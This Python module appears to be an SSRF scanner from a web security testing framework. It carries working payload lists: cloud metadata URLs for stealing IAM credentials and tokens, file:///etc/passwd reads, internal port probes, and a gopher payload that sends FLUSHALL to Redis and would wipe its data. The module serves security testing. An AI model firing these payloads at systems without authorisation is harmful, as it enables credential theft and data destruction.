"""
SSRFScanner — Server-Side Request Forgery detection with OOB confirmation.

Lifecycle:
  DETECTED:   Cloud metadata signature matched (1-2 sigs, low confidence)
  VALIDATED:  Strong metadata response (2+ sigs, JSON body, credentials)
  EXPLOITABLE: (not applicable — SSRF is inherently exploitable)
  VERIFIED:   OOB callback received

Covers:
  - Multi-cloud metadata endpoints (AWS, GCP, Azure, Alibaba, DO, OpenStack, Oracle)
  - Protocol smuggling (gopher://, dict://, file://)
  - Internal port scanning via SSRF
  - Redirect-following SSRF
  - AWS IMDSv2 (token-header-based)
  - Semi-blind SSRF via DNS exfiltration
  - OOB callback confirmation

Maturity: Level 4 (OOB-confirmed)
"""

import hashlib
from urllib.parse import urlparse, urlencode, parse_qs
import json

from models.finding import Finding
from models.evidence import (
    HttpRequestEvidence,
    ResponseExcerptEvidence,
)
from modules.utils import (
    finding, log, Colors, _build_curl, safe_get, safe_post,
    VerificationStage,
    safe_cookies_dict,
)
from scanners.base import ScannerBase, DetectionResult, ValidationResult

SSRF_PARAM_NAMES = [
    "url", "uri", "path", "file", "document", "page", "redirect",
    "dest", "target", "next", "proxy", "endpoint", "link",
    "image", "img", "src", "load", "fetch", "read", "include",
    "host", "domain", "reference", "callback", "webhook",
]

SSRF_METADATA_PAYLOADS = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        # IMDSv2 — needs token header
        "http://169.254.169.254/latest/meta-data/",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "alibaba": [
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/user-data/",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    ],
    "digitalocean": [
        "http://169.254.169.254/metadata/v1.json",
        "http://169.254.169.254/metadata/v1/id",
        "http://169.254.169.254/metadata/v1/region",
    ],
    "openstack": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/openstack/",
    ],
    "oracle": [
        "http://169.254.169.254/opc/v2/instance/",
    ],
}

SSRF_PROTOCOL_PAYLOADS = [
    "gopher://localhost:6379/_INFO",
    "gopher://localhost:6379/_FLUSHALL",
    "dict://localhost:6379/INFO",
    "dict://localhost:27017/",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "ftp://localhost:21/",
]

# Common internal services to probe via SSRF
SSRF_PORT_PROBES = [
    ("6379", "Redis"),
    ("27017", "MongoDB"),
    ("9200", "Elasticsearch"),
    ("3306", "MySQL"),
    ("5432", "PostgreSQL"),
    ("11211", "Memcached"),
    ("8080", "HTTP-proxy"),
    ("22", "SSH"),
]

SSRF_SIGNATURES = [
    "ami-id", "ami-launch-index", "ami-manifest-path", "block-device-mapping",
    "hostname", "iam", "instance-action", "instance-id", "instance-type",
    "local-hostname", "local-ipv4", "mac", "metrics", "network",
    "placement", "product-codes", "public-hostname", "public-ipv4",
    "public-keys", "reservation-id", "security-groups",
    "meta-data", "user-data", "ec2_", "iam_role",
    # Azure
    "compute", "azEnvironment", "location", "resourceId", "vmId",
    # DigitalOcean
    "droplet_id", "digitalocean",
    # Alibaba
    "instance-id", "region-id", "zone-id",
    # Oracle
    "canonicalRegionName", "displayName", "ociAdName",
]

# Additional metadata response signatures for GCP + Azure token responses
SSRF_CREDENTIAL_SIGNATURES = [
    "access_token", "client_id", "refresh_token", "secret",
    "token_type", "expires_in", "AccountKey", "ConnectionString",
]


class SSRFScanner(ScannerBase):
    SCANNER_NAME = "ssrf"
    SCANNER_MATURITY = 4

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)
        self._oob_registrations: list[tuple[str, str, str]] = []

    # ── Detection helpers ───────────────────────────────────────────────

    def _test_metadata_payload(self, session, test_url: str, payload: str,
                               headers: dict | None = None) -> dict | None:
        """Send a metadata payload and return match info if detected."""
        resp = safe_get(session, test_url, self.timeout, headers=headers)
        if not resp:
            return None
        body = resp.text
        matched = [sig for sig in SSRF_SIGNATURES if sig in body]
        cred_matched = [sig for sig in SSRF_CREDENTIAL_SIGNATURES if sig in body]
        if matched:
            return {
                "matched": matched,
                "cred_matched": cred_matched,
                "json": body.strip().startswith("{"),
                "response": resp,
                "payload": payload,
            }
        return None

    def detect(self, url: str, parameter: str | None = None) -> DetectionResult | None:
        parsed = urlparse(url)
        original_params = parse_qs(parsed.query)
        params = list(dict.fromkeys(list(original_params.keys()) + SSRF_PARAM_NAMES))

        for param in params:
            # ── Metadata endpoints (all clouds) ────────────────────────
            for cloud, payloads in SSRF_METADATA_PAYLOADS.items():
                for payload in payloads:
                    test_url = self._build_ssrf_url(url, parsed, original_params, param, payload)
                    headers = {}
                    if cloud == "gcp":
                        headers = {"Metadata-Flavor": "Google"}
                    if cloud == "azure":
                        headers = {"Metadata": "true"}
                    if cloud == "aws" and "IMDSv2" not in payload:
                        pass  # IMDSv1 — no header

                    result = self._test_metadata_payload(self.session, test_url, payload, headers)
                    if result:
                        return DetectionResult(
                            url=test_url,
                            parameter=param,
                            payload=payload,
                            context=f"ssrf_metadata:{','.join(result['matched'])}",
                            raw_response=result["response"],
                            evidence_signals=result["matched"]
                                + (["json"] if result["json"] else [])
                                + (["credentials"] if result["cred_matched"] else []),
                        )

        return None

    def validate(self, detection: DetectionResult) -> ValidationResult | None:
        from scanners.base import ValidationResult
        sigs = getattr(detection, "evidence_signals", []) or []
        json_detected = "json" in sigs
        credentials_found = "credentials" in sigs
        metadata_sigs = [s for s in sigs if s not in ("json", "credentials")]
        score = 0
        if len(metadata_sigs) >= 3:
            score += 40
        elif len(metadata_sigs) >= 2:
            score += 30
        elif metadata_sigs:
            score += 20
        if json_detected:
            score += 15
        if credentials_found:
            score += 20
        if score >= 55:
            return ValidationResult(confirmed=True, signals=metadata_sigs, method="metadata_strong", detail=f"SSRF confidence score {score}")
        if score >= 30:
            return ValidationResult(confirmed=True, signals=metadata_sigs, method="metadata_weak", detail=f"SSRF confidence score {score}")
        return ValidationResult(confirmed=False, signals=metadata_sigs, method="metadata_weak", detail="Low confidence SSRF")

    def collect_evidence(self, detection: DetectionResult,
                         validation_result: ValidationResult | None = None) -> list:
        from models.evidence import HttpRequestEvidence, ResponseExcerptEvidence
        ev_list = []
        resp = detection.raw_response
        if resp:
            req_ev = HttpRequestEvidence(
                method="GET",
                url=detection.url,
                headers=dict(self.session.headers),
                curl_command=_build_curl("GET", detection.url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                description=f"SSRF probe to cloud metadata endpoint via {detection.url}",
            )
            resp_ev = ResponseExcerptEvidence(
                excerpt=resp.text[:500],
                length=len(resp.text),
                context="ssrf_metadata",
                description=f"Cloud metadata response ({len(resp.text)} chars)",
            )
            ev_list.extend([req_ev, resp_ev])
        return ev_list

    def generate_reproduction(self, detection: DetectionResult,
                              validation_result: ValidationResult | None = None) -> list[str]:
        sigs = getattr(detection, "evidence_signals", []) or []
        metadata_sigs = [s for s in sigs if s not in ("json", "credentials")]
        return [
            f"Send GET request to {detection.url} — the vulnerable parameter is: {detection.parameter}",
            f"Observe cloud metadata signature in response: {', '.join(metadata_sigs[:3])}",
            "This confirms the server fetches URLs from user-controllable parameters and returns the response",
            "Escalate: attempt OOB callback confirmation for verified SSRF status",
        ]

    def _calculate_ssrf_confidence(self, signatures: list[str], baseline_diff: bool,
                                    json_detected: bool, credentials_found: bool) -> int:
        score = 0
        if len(signatures) >= 3:
            score += 40
        elif len(signatures) >= 2:
            score += 30
        elif signatures:
            score += 20
        if baseline_diff:
            score += 15
        if json_detected:
            score += 15
        if credentials_found:
            score += 20
        return min(100, score)

    # ── Internal port scanning ─────────────────────────────────────────

    def _probe_internal_service(self, url: str, param: str, parsed, original_params: dict) -> list[str]:
        """Try common internal service ports via SSRF and return reachable ones."""
        reachable: list[str] = []
        for port, service_name in SSRF_PORT_PROBES:
            probe = f"http://127.0.0.1:{port}/"
            test_url = self._build_ssrf_url(url, parsed, original_params, param, probe)
            try:
                resp = safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                if resp and resp.status_code not in (0, 502, 503, 504) and len(resp.text) > 0:
                    reachable.append(f"{service_name} (port {port})")
            except Exception:
                continue
        return reachable

    # ── Scan entry point ────────────────────────────────────────────────

    def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
        self._prepare_scan()
        oob_host = self.config.get("oob_host")
        urls = self.recon.get("urls", []) if target_urls is None else target_urls

        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                original_params = parse_qs(parsed.query)
                params = list(dict.fromkeys(list(original_params.keys()) + SSRF_PARAM_NAMES))

                baseline_resp = safe_get(self.session, url, self.timeout)
                baseline_hash = hashlib.md5(baseline_resp.text.encode()).hexdigest() if baseline_resp else None

                vulnerable_params: list[str] = []
                all_matched_sigs: set[str] = set()
                json_detected = False
                credentials_found = False
                matching_resp = None
                internal_services: list[str] = []

                for param in params:
                    # ── Metadata probe (all clouds) ────────────────────
                    found_metadata = False
                    for cloud, payloads in SSRF_METADATA_PAYLOADS.items():
                        for payload in payloads:
                            test_url = self._build_ssrf_url(url, parsed, original_params, param, payload)
                            headers = {}
                            if cloud == "gcp":
                                headers = {"Metadata-Flavor": "Google"}
                            if cloud == "azure":
                                headers = {"Metadata": "true"}
                            result = self._test_metadata_payload(self.session, test_url, payload, headers)
                            if result:
                                if matching_resp is None:
                                    matching_resp = result["response"]
                                vulnerable_params.append(param)
                                all_matched_sigs.update(result["matched"])
                                if result["json"]:
                                    json_detected = True
                                if result["cred_matched"]:
                                    credentials_found = True
                                found_metadata = True
                                break
                        if found_metadata:
                            break

                    # ── Protocol smuggling ─────────────────────────────
                    if not found_metadata:
                        for proto_payload in SSRF_PROTOCOL_PAYLOADS:
                            test_url = self._build_ssrf_url(url, parsed, original_params, param, proto_payload)
                            try:
                                resp = safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                                if resp and resp.status_code not in (502, 503, 504) and len(resp.text or "") > 0:
                                    # Different response from baseline suggests protocol handler
                                    if baseline_hash:
                                        cur_hash = hashlib.md5(resp.text.encode()).hexdigest()
                                        if cur_hash != baseline_hash:
                                            vulnerable_params.append(f"{param}[proto]")
                                            if matching_resp is None:
                                                matching_resp = resp
                            except Exception:
                                continue

                    # ── Internal port scanning ─────────────────────────
                    if not found_metadata:
                        svcs = self._probe_internal_service(url, param, parsed, original_params)
                        internal_services.extend(svcs)

                    # ── OOB probe ─────────────────────────────────────
                    if oob_host and self.validation:
                        oob_payload_url = f"http://{self.validation.callback_host}/ssrf"
                        oob_probe_url = self._build_ssrf_url(url, parsed, original_params, param, oob_payload_url)
                        safe_get(self.session, oob_probe_url, self.timeout, raise_for_status=False)
                        self.validation.register_oob("ssrf", oob_payload_url, oob_probe_url)
                        self._oob_registrations.append(("ssrf", oob_payload_url, oob_probe_url))

                # ── Build finding(s) ──────────────────────────────────
                if matching_resp is not None and vulnerable_params:
                    resp_hash = hashlib.md5(matching_resp.text.encode()).hexdigest()
                    baseline_diff = baseline_hash is not None and resp_hash != baseline_hash
                    confidence_score = self._calculate_ssrf_confidence(
                        list(all_matched_sigs), baseline_diff, json_detected, credentials_found,
                    )

                    verified_using = "metadata"
                    details_parts = [
                        f"Vulnerable parameters ({len(vulnerable_params)}): {', '.join(vulnerable_params[:10])}"
                    ]
                    if internal_services:
                        details_parts.append(f"Internal services reachable: {', '.join(internal_services[:5])}")
                        verified_using = "internal_service"

                    if all_matched_sigs:
                        detection = DetectionResult(
                            url=url,
                            parameter=", ".join(vulnerable_params[:5]),
                            payload="metadata",
                            context=f"ssrf_metadata:{','.join(all_matched_sigs)}",
                            raw_response=matching_resp,
                            evidence_signals=list(all_matched_sigs)
                                + (["json"] if json_detected else [])
                                + (["credentials"] if credentials_found else []),
                        )
                        validation_result = self.validate(detection)
                        evidence_list = self.collect_evidence(detection, validation_result)
                        for ev in evidence_list:
                            self.evidence_engine.store(ev)

                        parsed_for_fp = urlparse(url)
                        ssrf_url = f"{parsed_for_fp.scheme}://{parsed_for_fp.netloc}"

                        f = finding(
                            vuln_type="Confirmed SSRF",
                            url=ssrf_url,
                            severity="critical",
                            details="; ".join(details_parts),
                            evidence=f"Signatures: {', '.join(list(all_matched_sigs)[:5])}",
                            request=_build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                            response_excerpt=matching_resp.text[:500],
                            steps_to_reproduce=self.generate_reproduction(detection, validation_result),
                            verification_stage=VerificationStage.VALIDATED.value,
                            validation_steps=[f"Cloud metadata signature matched: {s}" for s in all_matched_sigs],
                            confidence_score=confidence_score,
                        )
                        if f:
                            self._enrich_finding(f, len(evidence_list), f["verification_stage"])
                            if self._add_finding(f):
                                fingerprint = f.get("fingerprint", "")
                                if fingerprint and self.evidence_engine is not None:
                                    for ev in evidence_list:
                                        self.evidence_engine.link_to_finding(ev, fingerprint)

            except Exception as e:
                log(f"  [SSRF] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return self._get_findings()

    def finalize(self) -> list[Finding]:
        extra: list[dict] = []
        if not self.validation:
            return extra
        oob_evidence_list = self.validation.poll_oob()
        for oob_ev in oob_evidence_list:
            callback_raw = oob_ev.raw_data or ""
            payload_str = oob_ev.callback_host or ""
            url_str = ""
            for vt, pl, u in self._oob_registrations:
                if payload_str and payload_str in pl:
                    url_str = u
                    break
            if not url_str:
                url_str = self.base_url
            if self.evidence_engine is not None:
                self.evidence_engine.store(oob_ev)
            f = finding(
                vuln_type="Confirmed SSRF (OOB)",
                url=url_str,
                severity="critical",
                details="OOB callback received for SSRF probe — DNS/HTTP interaction confirmed from target server",
                evidence=f"Callback: {callback_raw[:200]}",
                request=_build_curl("GET", url_str, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                verification_stage=VerificationStage.VERIFIED.value,
                validation_steps=["OOB callback verified: DNS/HTTP interaction confirmed from target infrastructure"],
                response_excerpt="(SSRF confirmed via out-of-band callback — DNS/HTTP request received from target server)",
                steps_to_reproduce=[
                    f"Send SSRF probe to {url_str} with an OOB payload (DNS/HTTP to attacker-controlled host)",
                    f"Observe OOB callback from target server IP — confirms the server makes external requests from user-controllable input",
                    f"Escalate: use SSRF to access internal metadata endpoints (169.254.169.254) or internal services",
                ],
            )
            if f:
                self._enrich_finding(f, 1, f["verification_stage"])
                if self._add_finding(f):
                    fingerprint = f.get("fingerprint", "")
                    if fingerprint and self.evidence_engine is not None:
                        self.evidence_engine.link_to_finding(oob_ev, fingerprint)
        return extra

    def _build_ssrf_url(self, url: str, parsed, original_params: dict, param: str, payload: str) -> str:
        if param in original_params:
            return self._inject_param(url, param, payload)
        separator = "&" if parsed.query else "?"
        return f"{url}{separator}{urlencode({param: payload})}"

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        from urllib.parse import urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
